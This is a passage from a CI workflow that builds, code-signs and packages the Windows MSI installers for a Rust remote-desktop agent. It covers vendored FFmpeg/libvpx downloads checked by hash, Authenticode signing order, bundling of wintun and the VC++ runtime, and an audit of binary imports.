          # this on libvpx 1.12 / 1.13 / 1.16 alike, so it's not a
          # libvpx-version issue, it's a Windows-libclang issue.
          #
          # Workaround: skip bindgen entirely. env-libvpx-sys ships
          # pre-generated FFI for libvpx 1.3.0–1.13.0 and its build.rs
          # picks the file matching pkg-config's reported version EXACTLY
          # — hence the 1.12.0 pin. Built once by vendor-libvpx-windows.yml
          # (same manifest/baseline/triplet the inline vcpkg build used)
          # and fetched here in seconds instead of ~5 min of vcpkg compile
          # per tag — same pattern as the vendored FFmpeg below.
          $dl = "$env:RUNNER_TEMP\vpxdl"
          gh release download vendored-libvpx-1.12.0 --repo "${{ github.repository }}" `
            --pattern 'libvpx-1.12.0-win64-msvc.zip*' --dir $dl
          $zip = "$dl\libvpx-1.12.0-win64-msvc.zip"
          $expected = ((Get-Content "$zip.sha256" -Raw).Trim() -split '\s+')[0].ToLower()
          $actual = (Get-FileHash -Algorithm SHA256 $zip).Hash.ToLower()
          if ($actual -ne $expected) { Write-Host "::error::vendored libvpx sha256 mismatch (got $actual, want $expected)"; exit 1 }
          # Extract to the EXACT tree the old inline vcpkg build produced so
          # the baked .pc paths + the env exports below stay valid.
          $root = 'C:\vpx-pin\installed\x64-windows'
          New-Item -ItemType Directory -Path $root -Force | Out-Null
          tar -xf $zip -C $root
          if (-not (Test-Path "$root\lib\pkgconfig\vpx.pc")) { Write-Host "::error::vpx.pc missing after extract"; exit 1 }
          # Expose the install dir to subsequent steps.
          "PKG_CONFIG_PATH=C:/vpx-pin/installed/x64-windows/lib/pkgconfig" | Out-File -FilePath $env:GITHUB_ENV -Append
          # The x64-windows libvpx port yields a static .lib only (no DLL),
          # so the staging step below no-ops; the env stays for the day the
          # port grows a bin/ again.
          "VPX_DLL_DIR=C:/vpx-pin/installed/x64-windows/bin" | Out-File -FilePath $env:GITHUB_ENV -Append

      # =======================================================================
      # rc.65 Option B HEVC → ffmpeg-next 8.x links a static-md FFmpeg
      # (avcodec/…/nvcodec/qsv/amf/vpx, LGPL — no GPL x264/x265). Until
      # rc.179 this was a 25-40 min inline vcpkg build behind an
      # actions/cache that was BOTH structurally unreliable for tag runs
      # (caches save on the tag ref; a future tag can only restore own-ref
      # or default-branch caches, and nothing ever seeded master) AND
      # LRU-evicted by the repo's blown 10 GB cache budget — rc.176
      # measured a 29-min rebuild on a miss. Now built ONCE by
      # vendor-ffmpeg-windows.yml (identical manifest/baseline/triplet,
      # LGPL-verified) and fetched from the vendored-ffmpeg-9.0.1 release
      # in seconds. Re-dispatch that workflow when bumping FFmpeg.
      # =======================================================================
      - name: Fetch vendored FFmpeg 9.0.1 (win64 static-md, LGPL, minimal)
        shell: pwsh
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          $ErrorActionPreference = 'Stop'
          $dl = "$env:RUNNER_TEMP\ffdl"
          # P3e lever B: the MINIMAL tree — --disable-everything + exactly the
          # ten HW encoders the agent dispatches (avcodec.lib 139.3 -> 12.1 MB;
          # vendor-ffmpeg-windows.yml's verify step asserts the symbol set).
          # Rollback = drop the `-minimal` suffix here; the full zip stays on
          # the same release untouched. FR-78 P0 added `-d3d12-vulkan` (six
          # more encoders, both backends dlopen'd by FFmpeg — no new import);
          # rollback = drop that suffix. FR-85 P4c added `-h264dec-aac` (the
          # software h264 decoder the recorder's editor needs and the aac
          # encoder for its sound; no new import); rollback = drop that one.
          gh release download vendored-ffmpeg-9.0.1 --repo "${{ github.repository }}" `
            --pattern 'ffmpeg-9.0.1-win64-msvc-static-md-lgpl-minimal-d3d12-vulkan-h264dec-aac.zip*' --dir $dl
          $zip = "$dl\ffmpeg-9.0.1-win64-msvc-static-md-lgpl-minimal-d3d12-vulkan-h264dec-aac.zip"
          $expected = ((Get-Content "$zip.sha256" -Raw).Trim() -split '\s+')[0].ToLower()
          $actual = (Get-FileHash -Algorithm SHA256 $zip).Hash.ToLower()
          if ($actual -ne $expected) { Write-Host "::error::vendored FFmpeg sha256 mismatch (got $actual, want $expected)"; exit 1 }
          # Extract to the EXACT tree the old inline vcpkg build produced so
          # the baked .pc paths + every downstream step (PKG_CONFIG_PATH
          # append, static-md no-op DLL staging) stay valid. bsdtar handles
          # zip and is much faster than Expand-Archive. (If bsdtar ever
          # chokes on Compress-Archive's backslash entry names, swap to
          # Expand-Archive — the .pc assert below catches it loudly.)
          $root = 'C:\ffmpeg-pin\installed\x64-windows-static-md'
          New-Item -ItemType Directory -Path $root -Force | Out-Null
          tar -xf $zip -C $root
          foreach ($pc in 'libavcodec.pc', 'libavutil.pc') {
            if (-not (Test-Path "$root\lib\pkgconfig\$pc")) { Write-Host "::error::$pc missing after extract"; exit 1 }
          }
          Write-Host "FFmpeg pkg-config files present at $root\lib\pkgconfig\"
          # ── FR-62 A2 drift gate (Windows twin — see the Linux job): assert
          #    the vendored libs were built from the committed FFmpeg source
          #    patches. The vcpkg overlay build wrote ROOMLER-PATCHES.txt
          #    (sha256 per patch) into the zip root. Fail closed on mismatch or
          #    an absent manifest while patches exist — a stale vendored asset
          #    must never ship. Fix = re-run vendor-ffmpeg-windows.yml.
          $committed = Get-ChildItem "$env:GITHUB_WORKSPACE\.github\ffmpeg-patches\*.patch" -ErrorAction SilentlyContinue
          if ($committed) {
            $want = $committed | ForEach-Object {
              "{0} {1}" -f (Get-FileHash -Algorithm SHA256 $_.FullName).Hash.ToLower(), $_.Name
            } | Sort-Object
            $manifestPath = "$root\ROOMLER-PATCHES.txt"
            if (-not (Test-Path $manifestPath)) {
              Write-Host "::error::vendored FFmpeg carries no ROOMLER-PATCHES.txt but $($committed.Count) patch(es) are committed — re-vendor before tagging"; exit 1
            }
            $got = Get-Content $manifestPath | Where-Object { $_.Trim() -ne '' } | ForEach-Object {
              $parts = $_ -split '\s+', 2
              "{0} {1}" -f $parts[0].ToLower(), $parts[1].Trim()
            } | Sort-Object
            if (($want -join "`n") -ne ($got -join "`n")) {
              Write-Host "::error::vendored FFmpeg patch manifest != committed .github/ffmpeg-patches/ — re-run vendor-ffmpeg-windows.yml"
              Write-Host "--- committed ---"; $want | ForEach-Object { Write-Host $_ }
              Write-Host "--- in asset ---"; $got | ForEach-Object { Write-Host $_ }
              exit 1
            }
            Write-Host "FR-62 A2 gate OK: vendored FFmpeg built from $($committed.Count) committed patch(es)"
          }

      - name: Append FFmpeg to PKG_CONFIG_PATH + DLL PATH
        shell: pwsh
        run: |
          # libvpx step already set PKG_CONFIG_PATH=C:/vpx-pin/...; ffmpeg
          # needs to extend, not replace. Read current value, append ffmpeg
          # path, write back. Windows pkg-config uses ';' as separator.
          $existing = [Environment]::GetEnvironmentVariable('PKG_CONFIG_PATH', 'Process')
          if ([string]::IsNullOrEmpty($existing)) { $existing = "" } else { $existing = "$existing;" }
          $combined = "${existing}C:/ffmpeg-pin/installed/x64-windows-static-md/lib/pkgconfig"
          "PKG_CONFIG_PATH=$combined" | Out-File -FilePath $env:GITHUB_ENV -Append
          Write-Host "PKG_CONFIG_PATH=$combined"
          # rc.71 hotfix: vcpkg's x64-windows triplet produces DLLs for
          # ffmpeg (libavcodec-*.dll etc.), not static libs. The agent test
          # binary links against them at compile time but Windows can't
          # find them at runtime (STATUS_DLL_NOT_FOUND, 0xc0000135 — rc.69
          # CI failure). Add the ffmpeg bin dir to GITHUB_PATH so cargo test
          # picks it up. Also stash for the MSI staging step below.
          "C:\ffmpeg-pin\installed\x64-windows-static-md\bin" | Out-File -FilePath $env:GITHUB_PATH -Append
          "FFMPEG_DLL_DIR=C:\ffmpeg-pin\installed\x64-windows-static-md\bin" | Out-File -FilePath $env:GITHUB_ENV -Append

      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@1.95.0

      - name: Restore cargo seed (lockfile-generation keys)
        # Explicit actions/cache with OUR key scheme -- rust-cache cannot
        # express "unique key + prefix restore + no env hash": with
        # add-rust-environment-hash-key:false its `key:` input is folded
        # into the dropped component (a no-op -- #482, re-proven by probe
        # run 31907241610). Unique key per Cargo.lock => saves always
        # land; prefix restore => never an absent-key window (the rc.382
        # race); no env hash => no runner-image warm/cold lottery. Full
        # story in .github/actions/seed-cache-restore. The paired save
        # step is at the end of this job.
        continue-on-error: true
        uses: ./.github/actions/seed-cache-restore
        # GH_TOKEN: the asset-based restore downloads from the seed-cache
        # release (probe run 32903453670 built cold on every lane for want
        # of it — the old actions/cache restore needed no token).
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          shared-key: agent-windows-vp9-444

      - name: Install WiX Toolset v3
        shell: pwsh
        run: |
          choco install -y wixtoolset
          # WiX v3 installs to C:\Program Files (x86)\WiX Toolset v3.14\bin by
          # default — add to PATH for this and subsequent steps.
          $wixBin = Get-ChildItem "C:\Program Files (x86)\WiX Toolset v*\bin" | Select-Object -First 1
          "$($wixBin.FullName)" | Out-File -FilePath $env:GITHUB_PATH -Append

      - name: Install cargo-wix
        # Idempotent for the same reason as the cargo-deb steps: the seed
        # caches restore the tool and a plain install errors on it.
        shell: pwsh
        run: |
          if (-not (Get-Command cargo-wix -ErrorAction SilentlyContinue)) {
            cargo install cargo-wix --locked
          }

      - name: Build agent (release, full-hw + vp9-444 + system-context + ffmpeg-encoder)
        # `vp9-444` (without `-bindgen`) uses env-libvpx-sys's
        # pre-generated FFI — no libclang invocation, no
        # forward-decl-opaque issue. pkg-config still has to find
        # `vpx.pc` (which the vcpkg step exported via PKG_CONFIG_PATH);
        # the linker resolves vpx.lib from the pkg-config-emitted
        # `-L`. No INCLUDE / vcvars dance needed.
        #
        # `system-context` (added 0.3.0) compiles the M3 A1 SYSTEM-
        # context worker plumbing: DXGI Desktop Duplication backend,
        # GDI BitBlt fallback, SetThreadDesktop input rebind, and
        # winlogon-token spawn. The perMachine MSI's SCM service
        # exercises this code path to drive the lock screen / UAC.
        # The perUser MSI gets the same binary but `worker_role::
        # probe_self()` returns `User` (perUser is never spawned as
        # LocalSystem) so none of the SystemContext code ever fires
        # — the perUser path stays exactly as it was in 0.2.7.
        #
        # rc.65: `ffmpeg-encoder` adds the ffmpeg-next dep and exercises
        # the FFmpeg link via `linked_libavcodec_version()`. The actual
        # encoder backend lands in rc.66 — for now this RC verifies:
        # (a) ffmpeg-next 9.x compiles against vcpkg's FFmpeg
        # (b) hevc_qsv + vp9_qsv symbols are reachable (asserted by the
        #     unit test `libavcodec_version_is_ffmpeg_7_or_newer`)
        # (c) MSI size delta vs rc.64 is within budget (≤ +8 MB; HARD
        #     STOP enforced by the next step at +12 MB)
        shell: pwsh
        # `overlay-l3` (Phase 3b): the overlay mesh (WireGuard + TUN). The
        # binary compiles overlay in everywhere; on Windows the TUN is
        # Wintun, whose signed `wintun.dll` is LoadLibrary'd at runtime
        # from the app dir — bundled into both MSIs via the `WintunDll`
        # wxs component (staged by the wintun step below). Linux
        # (/dev/net/tun) + macOS (utun) need no extra dep. Default-OFF
        # (config `overlay_enabled`).
        # `full-hw` includes `audio` (via `full`) → cpal WASAPI loopback (no
        # extra lib on Windows) + audiopus (bundled libopus via CMake).
        # `hive` (FR-90 P1i-3): agent sessions, run as the user signed in at
        # the console, at Medium. Inert until a device's owner sets
        # `hive_enabled`; a device that never does keeps nothing for them.
        env:
          CMAKE_POLICY_VERSION_MINIMUM: "3.5"
        run: cargo build -p roomlerd --release --features "full-hw,hive,vp9-444,system-context,ffmpeg-encoder,overlay-l3,overlay-netstack,ssh-server"

      - name: Build the roomler CLI shim for the MSI bundle (P3e lever D)
        shell: pwsh
        run: |
          # P4b put the tunnel CLI inside both MSIs so daemon installs subsume
          # it and the MSI stays the ONE updater for the node stack. That is
          # unchanged — what changed (P3e lever D) is HOW: the daemon now owns
          # the command surface (`roomlerd cli` → roomler_cli::cli) and the
          # MSI carries a ~150 KB shim instead of a second full binary.
          #
          # rc.361 measurements that motivated it: roomler.exe was 22.1 MiB of
          # which cargo-bloat attributes only 1.16 MiB to CLI-specific code —
          # the rest duplicated std/webrtc/tunnel_core/tokio/rustls/reqwest/
          # quinn/clap that roomlerd.exe already links. This step also used to
          # cost 143 s (3rd-costliest in the job) because it rebuilt shared
          # deps under a DIFFERENT feature set than the agent build above.
          #
          # Both wxs files reference target\release\roomler-shim.exe at harvest
          # time, so this MUST still run before the two cargo-wix builds below.
          # Tunnel-ONLY hosts are unaffected: release-tunnel.yml keeps building
          # and shipping the real standalone `roomler` binary.
          cargo build -p roomler-cli-shim --release
          if (-not (Test-Path target\release\roomler-shim.exe)) {
            Write-Host "::error::roomler-shim.exe not produced — the TunnelExe wxs component would fail the MSI harvest (LGHT0103)"
            exit 1
          }
          $kb = [math]::Round((Get-Item target\release\roomler-shim.exe).Length/1KB, 0)
          Write-Host "Staged roomler-shim.exe ($kb KB, installs as roomler.exe) for the TunnelExe component"

      # The rc.65 "Verify FFmpeg link via unit test" step is GONE: even in
      # --release with the exact build feature set, `cargo test` cost 5m33s
      # per tag (dev-dep tokio-test enables tokio/test-util → the tokio
      # subgraph rebuilds in the test graph). The same libavcodec >= 61
      # assert now runs inside `encoder-smoke` below on the already-built
      # EXE — a link/version failure still fails this job before MSI
      # packaging, at zero compile cost.

      - name: Stage vpx.dll alongside agent binary (if not statically linked)
        shell: pwsh
        run: |
          # vcpkg's `x64-windows` triplet for libvpx produces a static
          # .lib + .pdb only — no .dll. The agent binary links libvpx
          # statically and runs without a separate DLL. If a future
          # vcpkg port (or a triplet swap) produces a vpx.dll, copy it
          # next to roomler-agent.exe so cargo-wix harvests it. No-op
          # when the DLL isn't there.
          $dll = Join-Path $env:VPX_DLL_DIR "vpx.dll"
          if (Test-Path $dll) {
            Copy-Item $dll target\release\
            Write-Host "Staged vpx.dll for MSI harvest"
          } else {
            Write-Host "No vpx.dll under $env:VPX_DLL_DIR — static linkage, nothing to stage"
          }

      - name: Stage FFmpeg DLLs alongside agent binary (no-op for static-md)
        # rc.76: triplet switched to x64-windows-static-md so no FFmpeg
        # DLLs exist — FFmpeg is statically linked into the EXE. This
        # step becomes a soft no-op when FFMPEG_DLL_DIR is empty or
        # doesn't exist (vs the rc.71 hard error). Kept around in case
        # we ever switch back to a dynamic triplet for size reasons.
        shell: pwsh
        run: |
          if (-not (Test-Path $env:FFMPEG_DLL_DIR)) {
            Write-Host "No bin dir under $env:FFMPEG_DLL_DIR — static-md triplet, nothing to stage."
            exit 0
          }
          $dlls = Get-ChildItem -Path $env:FFMPEG_DLL_DIR -Filter "*.dll"
          if ($dlls.Count -eq 0) {
            Write-Host "No DLLs under $env:FFMPEG_DLL_DIR — static-md triplet, nothing to stage."
            exit 0
          }
          foreach ($dll in $dlls) {
            Copy-Item $dll.FullName target\release\
          }
          Write-Host "Staged $($dlls.Count) FFmpeg DLLs for MSI harvest:"
          foreach ($dll in $dlls) {
            Write-Host "  $($dll.Name) ($([math]::Round($dll.Length / 1KB, 0)) KB)"
          }

      - name: Encoder smoke test (FFmpeg link check + MF cascade → openh264 fallback)
        shell: pwsh
        env:
          RUST_LOG: roomlerd=debug,info
        run: |
          # Probe the hardware encoder path. On windows-latest the runner
          # exposes a WARP software D3D11 device; the MS H264 Encoder MFT
          # falls back to its SW path there, which is enough for "it loads,
          # negotiates types, produces an IDR, no SEH crash". Debug logging
          # surfaces STREAM_CHANGE notifications and per-frame byte counts
          # so regressions in the MF drain path are visible in CI output.
          # P3d Slice B: daemon EXE is now roomlerd.exe.
          # Under ffmpeg-encoder, encoder-smoke FIRST asserts the linked
          # libavcodec is >= 61 (FFmpeg 7+) — the load-bearing replacement
          # for the deleted 5m33s cargo-test link-verify step. On failure:
          # re-pin ffmpeg-next in agents/roomlerd/Cargo.toml or
          # re-vendor via vendor-ffmpeg-windows.yml.
          & "target\release\roomlerd.exe" encoder-smoke --encoder hardware

      # Sign the MSI PAYLOAD, before cargo-wix harvests it.
      #
      # Signing only the .msi leaves roomlerd.exe + the shim unsigned ON DISK
      # after install -- and the on-disk binaries are what AV scans, what Task
      # Manager shows a publisher for, and what an AppLocker/WDAC publisher
      # rule matches. An MSI-only signature buys none of that.
      #
      # Both wxs files reference target\release\{roomlerd,roomler-shim}.exe by
      # literal path and BOTH cargo-wix runs are --no-build, so signing once
      # here covers the perUser AND perMachine MSIs.
      #
      # Placement is load-bearing on both sides:
      #   * AFTER encoder-smoke, so a broken FFmpeg link fails the job before
      #     it spends a signature.
      #   * BEFORE the wintun + VC-CRT staging steps, so the THIRD-PARTY
      #     Microsoft/WireGuard-signed DLLs are not even on disk yet.
      #     Authenticode `sign` REPLACES rather than appends, and AV
      #     allow-lists key off the original publishers -- ordering makes
      #     re-signing them structurally impossible rather than merely
      #     unintended.
      #
      # INVARIANT: no step after this one may run `cargo build` in this job.
      # A relink silently drops these signatures and only the outer MSI
      # signature would survive.
      - name: Sign MSI payload binaries
        id: sign_payload
        uses: ./.github/actions/sign-windows
        with:
          files: |
            target\release\roomlerd.exe
            target\release\roomler-shim.exe
          description:              'Roomler Daemon'
          mode:                     ${{ github.event.inputs.signing_mode || 'auto' }}
          require:                  ${{ needs.validate-version.outputs.is_release == 'true' || github.event.inputs.require_signing == 'true' }}
          expect-subject-contains:  ${{ vars.AZURE_SIGNING_EXPECT_SUBJECT }}
          endpoint:                 ${{ vars.AZURE_SIGNING_ENDPOINT }}
          signing-account-name:     ${{ vars.AZURE_SIGNING_ACCOUNT }}
          certificate-profile-name: ${{ vars.AZURE_SIGNING_PROFILE }}
          azure-client-id:          ${{ vars.AZURE_CLIENT_ID }}
          azure-tenant-id:          ${{ vars.AZURE_TENANT_ID }}
          azure-subscription-id:    ${{ vars.AZURE_SUBSCRIPTION_ID }}
          local-pfx-base64:         ${{ secrets.WIN_TEST_PFX_BASE64 }}
          local-pfx-password:       ${{ secrets.WIN_TEST_PFX_PASSWORD }}

      - name: Stage wintun.dll for the overlay TUN (overlay-l3 MSI bundle)
        shell: pwsh
        run: |
          # overlay-l3's Windows TUN is Wintun, whose signed wintun.dll is
          # LoadLibrary'd at runtime from the app dir. Fetch the official
          # build (WireGuard LLC, Authenticode-signed) and stage the amd64
          # DLL next to the EXE so the `WintunDll` wxs component (in both
          # wix/ + wix-perMachine/) bundles it into both MSIs. The build
          # above includes overlay-l3, so the agent will LoadLibrary this.
          $ver = '0.14.1'
          $zip = "$env:RUNNER_TEMP\wintun.zip"
          Invoke-WebRequest -Uri "https://www.wintun.net/builds/wintun-$ver.zip" -OutFile $zip -UseBasicParsing
          $dest = "$env:RUNNER_TEMP\wintun"
          Expand-Archive -Path $zip -DestinationPath $dest -Force
          $dll = Join-Path $dest 'wintun\bin\amd64\wintun.dll'
          if (-not (Test-Path $dll)) { Write-Host "::error::wintun.dll (amd64) not found in the downloaded archive"; exit 1 }
          $sig = Get-AuthenticodeSignature $dll
          Write-Host "wintun.dll signature: $($sig.Status) -- signer: $($sig.SignerCertificate.Subject)"
          Copy-Item $dll target\release\wintun.dll -Force
          Write-Host "Staged wintun.dll ($([math]::Round((Get-Item target\release\wintun.dll).Length/1KB,0)) KB) for the MSI bundle"

      - name: Stage VC++ runtime DLLs alongside agent binary (app-local CRT)
        shell: pwsh
        run: |
          # Both wxs files bundle a `VcRedistCrt` component (the three CRT
          # DLLs our binaries actually import) so the install is
          # self-contained on machines without any VC++ 2015-2022
          # redistributable -- a fresh Windows box otherwise pops
          # "vcruntime140_1.dll was not found" the moment install.ps1
          # (or the operator) runs the freshly installed roomlerd.exe,
          # which links the CRT dynamically via its C++ encoder objects
          # (field report 2026-07-28). The DLLs come from the runner's
          # own VS installation; fail loudly if any expected name is
          # absent (the WiX harvest would die with LGHT0103 later
          # anyway). Mirrored in installer-smoke.yml.
          $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
          if (-not (Test-Path $vswhere)) { Write-Host "::error::vswhere.exe not found on the runner"; exit 1 }
          $vsRoot = & $vswhere -latest -products * -property installationPath
          $crtDir = Get-ChildItem -Directory "$vsRoot\VC\Redist\MSVC\*\x64\Microsoft.VC14*.CRT" -ErrorAction SilentlyContinue |
                    Sort-Object FullName | Select-Object -Last 1
          if (-not $crtDir) { Write-Host "::error::no Microsoft.VC14x.CRT redist folder under $vsRoot"; exit 1 }
          # Only what the import tables ask for: roomlerd.exe needs all three,
          # roomler.exe needs vcruntime140, roomler-desktop.exe needs none, and
          # msvcp140.dll itself imports only the two vcruntime DLLs. The other
          # six redist DLLs (concrt140, vccorlib140, msvcp140_1, msvcp140_2,
          # msvcp140_atomic_wait, msvcp140_codecvt_ids) are satellites a
          # consuming binary imports DIRECTLY when it uses the matching STL
          # feature; nothing we ship does, so they were 1.12 MiB of dead
          # payload per install. If a new C++ dependency lands, re-check with
          # `dumpbin -dependents target\release\roomlerd.exe | findstr /i 140`
          # and extend this list AND both wxs VcRedistCrt components together.
          $expected = @('msvcp140.dll', 'vcruntime140.dll', 'vcruntime140_1.dll')
          foreach ($n in $expected) {
            $src = Join-Path $crtDir.FullName $n
            if (-not (Test-Path $src)) { Write-Host "::error::$n missing from $($crtDir.FullName) -- VcRedistCrt harvest would fail (LGHT0103)"; exit 1 }
            Copy-Item $src target\release\ -Force
          }
          Write-Host "Staged $($expected.Count) VC++ runtime DLLs from $($crtDir.FullName)"

      - name: Build MSI (per-User)
        shell: pwsh
        run: |
          # cargo-wix reads agents/roomlerd/wix/main.wxs and sets the
          # Version preprocessor variable from --install-version.
          cargo wix -p roomlerd --nocapture --no-build --install-version $env:MSI_VERSION

      - name: Locate + rename per-User MSI
        id: locate
        shell: pwsh
        run: |
          $msi = Get-ChildItem "target/wix/*.msi" | Select-Object -First 1
          if (-not $msi) { throw "per-User MSI not produced" }
          # No `-unsigned` suffix. It used to be derived from whether a secret
          # was set, computed BEFORE signtool ran, so it described the repo's
          # configuration rather than the bytes. Signedness now comes from the
          # sign-windows action's verify step, which fails the job on a
          # release run. Consumers are suffix-agnostic in both directions
          # (agent_release.rs / updater.rs match on ".msi" + the
          # "-permachine-" infix), so older published releases keep resolving.
          $dst = "roomlerd-$env:VERSION-x86_64-pc-windows-msvc.msi"
          Move-Item $msi.FullName $dst
          "artifact=$dst" | Out-File -FilePath $env:GITHUB_OUTPUT -Append

      - name: Build MSI (per-Machine)
        shell: pwsh
        run: |
          # cargo-wix auto-discovers every *.wxs under wix/, so the
          # per-Machine source lives in a sibling wix-perMachine/ dir
          # to keep it OUT of the per-User build's compile set.
          # For this run we copy that file over wix/main.wxs (after
          # backing up the original), invoke cargo wix again, and
          # restore. Both MSIs end up in target/wix/ and we rename
          # to disambiguate. Different UpgradeCode + the mutually-
          # exclusive LaunchConditions ensure a host can only ever
          # have one of the two installed at a time.
          $wixDir = "agents\roomlerd\wix"
          $pmSrc  = "agents\roomlerd\wix-perMachine\main.wxs"
          Copy-Item "$wixDir\main.wxs" "$wixDir\main.wxs.bak" -Force
          Copy-Item $pmSrc "$wixDir\main.wxs" -Force
          try {
            cargo wix -p roomlerd --nocapture --no-build --install-version $env:MSI_VERSION
          } finally {
            Move-Item "$wixDir\main.wxs.bak" "$wixDir\main.wxs" -Force
          }

      - name: Locate + rename per-Machine MSI
        id: locate_pm
        shell: pwsh
        run: |
          $msi = Get-ChildItem "target/wix/*.msi" | Select-Object -First 1
          if (-not $msi) { throw "per-Machine MSI not produced" }
          # Suffix-free -- see the per-User rename above.
          $dst = "roomlerd-$env:VERSION-perMachine-x86_64-pc-windows-msvc.msi"
          Move-Item $msi.FullName $dst
          "artifact=$dst" | Out-File -FilePath $env:GITHUB_OUTPUT -Append

      # Sign the finished MSIs. Deliberately BEFORE the size-budget step so
      # the number the guard reports is the number that actually ships, and
      # before the SHA256 step so the checksums cover the signed bytes.
      # Cost is ~10 KB per file (high-entropy, so it does not compress) --
      # noise against the 13 MB baseline.
      - name: Sign MSIs
        id: sign_msi
        uses: ./.github/actions/sign-windows
        with:
          files: |
            ${{ steps.locate.outputs.artifact }}
            ${{ steps.locate_pm.outputs.artifact }}
          description:              'Roomler Agent installer'
          mode:                     ${{ github.event.inputs.signing_mode || 'auto' }}
          require:                  ${{ needs.validate-version.outputs.is_release == 'true' || github.event.inputs.require_signing == 'true' }}
          expect-subject-contains:  ${{ vars.AZURE_SIGNING_EXPECT_SUBJECT }}
          endpoint:                 ${{ vars.AZURE_SIGNING_ENDPOINT }}
          signing-account-name:     ${{ vars.AZURE_SIGNING_ACCOUNT }}
          certificate-profile-name: ${{ vars.AZURE_SIGNING_PROFILE }}
          azure-client-id:          ${{ vars.AZURE_CLIENT_ID }}
          azure-tenant-id:          ${{ vars.AZURE_TENANT_ID }}
          azure-subscription-id:    ${{ vars.AZURE_SUBSCRIPTION_ID }}
          local-pfx-base64:         ${{ secrets.WIN_TEST_PFX_BASE64 }}
          local-pfx-password:       ${{ secrets.WIN_TEST_PFX_PASSWORD }}

      # Regression detector for the payload-signing ordering above: if either
      # third-party DLL ever stops carrying its ORIGINAL publisher, something
      # re-signed it and broke every AV allow-list keyed to that publisher.
      - name: Assert third-party DLLs keep their original signatures
        shell: pwsh
        run: |
          $checks = @(
            @{ Path = 'target\release\wintun.dll';        Want = '*WireGuard*' },
            @{ Path = 'target\release\vcruntime140.dll';  Want = '*Microsoft*' }
          )
          foreach ($c in $checks) {
            $sig = Get-AuthenticodeSignature $c.Path
            $cn = if ($sig.SignerCertificate.Subject -match 'CN=([^,]+)') { $Matches[1].Trim() } else { '<none>' }
            Write-Host "$(Split-Path -Leaf $c.Path) signer: $cn (status=$($sig.Status))"
            if ($cn -notlike $c.Want) {
              Write-Host "::error::$($c.Path) is no longer signed by its original publisher (got '$cn'). The MSI payload-signing step must never include third-party DLLs."
              exit 1
            }
          }

      - name: Assert the shipping MSIs are self-contained (PE import audit)
        shell: pwsh
        run: |
          # The Windows half of the check that would have caught the macOS
          # .pkg which crashed on every clean Mac until rc.453: a dependency
          # satisfied by the BUILD machine is invisible to any check that runs
          # on the build machine. `windows-latest` carries the VC redist — it
          # is where the CRT staging step SOURCES those DLLs from — so
          # launching a binary here proves nothing about a fresh host.
          #
          # installer-smoke.yml (#647) audits an INSTALLED per-User MSI. This
          # is the same audit on the artifacts that actually ship, and it is
          # not redundant with that one:
          #   - installer-smoke builds a MINIMAL feature set; this job builds
          #     full-hw + vp9-444 + system-context + ffmpeg-encoder, which is
          #     where a new native dependency would actually appear.
          #   - it covers per-Machine too, a SEPARATE wxs whose component list
          #     can drift from the per-User one.
          #   - it reads the MSI, not `target\release\`. Auditing the staging
          #     directory would pass on a DLL that is staged but never
          #     harvested into a wxs component — i.e. exactly the bug where
          #     the install is missing a file the build had.
          #
          # ⚠️ This arms on a workflow_dispatch as well as on a tag, on
          # purpose. #639: `publish_release=false` does not exercise the
          # tag-only gates, so they are unrehearsable and first run when a
          # release is on the line. A gate you cannot rehearse is a gate you
          # find out about at the worst moment.
          $ErrorActionPreference = 'Stop'

          $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
          $vsRoot  = & $vswhere -latest -products * -property installationPath
          $dumpbin = Get-ChildItem -Path "$vsRoot\VC\Tools\MSVC\*\bin\Hostx64\x64\dumpbin.exe" |
                     Sort-Object FullName | Select-Object -Last 1
          if (-not $dumpbin) { throw "dumpbin.exe not found under $vsRoot" }

          # Redistributables — shipped by us, never by Windows. These MUST be
          # app-local; finding them in System32 proves nothing about a fresh
          # machine, so they are excluded from the System32 allowance below.
          $mustBeAppLocal = '^(msvcp|vcruntime|concrt|mfc|vcomp|msvcr)'

          function Audit-Dir {
            param([string]$Dir, [switch]$Quiet)
            $found    = @()
            $appLocal = @()
            foreach ($exe in @('roomlerd.exe', 'roomler.exe')) {
              $path = Join-Path $Dir $exe
              if (-not (Test-Path $path)) { $found += "$exe missing from the MSI payload"; continue }
              $imports = & $dumpbin /dependents $path |
                Select-String -Pattern '^\s{4}(\S+\.dll)$' |
                ForEach-Object { $_.Matches[0].Groups[1].Value }
              if (-not $imports) { $found += "$exe : dumpbin listed no imports (parse broke?)"; continue }
              if (-not $Quiet) { Write-Host "  $exe imports $($imports.Count) DLLs" }
              foreach ($dll in $imports) {
                if (Test-Path (Join-Path $Dir $dll)) { $appLocal += $dll; continue }
                if ($dll -match $mustBeAppLocal) {
                  $found += "$exe -> $dll is a REDISTRIBUTABLE and the MSI does not ship it"
                  continue
                }
                if ($dll -match '^(api-ms-win-|ext-ms-win-)') { continue }
                if (Test-Path (Join-Path $env:SystemRoot 'System32' $dll)) { continue }
                $found += "$exe -> $dll is neither in the MSI nor an OS DLL"
              }
            }
            [pscustomobject]@{
              Problems = @($found)
              AppLocal = @($appLocal | Sort-Object -Unique)
            }
          }

          $flavours = @(
            @{ Name = 'per-User';    Msi = '${{ steps.locate.outputs.artifact }}' },
            @{ Name = 'per-Machine'; Msi = '${{ steps.locate_pm.outputs.artifact }}' }
          )

          $lastDir      = $null
          $lastAppLocal = @()
          foreach ($f in $flavours) {
            Write-Host "--- 1/2: $($f.Name) MSI payload must be self-contained ---"
            $out = Join-Path $env:RUNNER_TEMP "msi-audit\$($f.Name)"
            Remove-Item $out -Recurse -Force -ErrorAction SilentlyContinue
            New-Item -ItemType Directory -Path $out -Force | Out-Null
            # /a is an ADMINISTRATIVE install: it lays the payload out on disk
            # without installing, registering or running anything.
            $msiPath = (Resolve-Path $f.Msi).Path
            $p = Start-Process msiexec.exe -Wait -PassThru `
                   -ArgumentList @('/a', "`"$msiPath`"", '/qn', "TARGETDIR=`"$out`"")
            if ($p.ExitCode -ne 0) { throw "msiexec /a failed for $($f.Name) with exit $($p.ExitCode)" }

            $hit = Get-ChildItem -Recurse $out -Filter 'roomlerd.exe' -File | Select-Object -First 1
            if (-not $hit) { throw "roomlerd.exe not found in the extracted $($f.Name) payload" }
            $installDir = $hit.DirectoryName
            Write-Host "  payload dir: $($installDir.Substring($out.Length))"

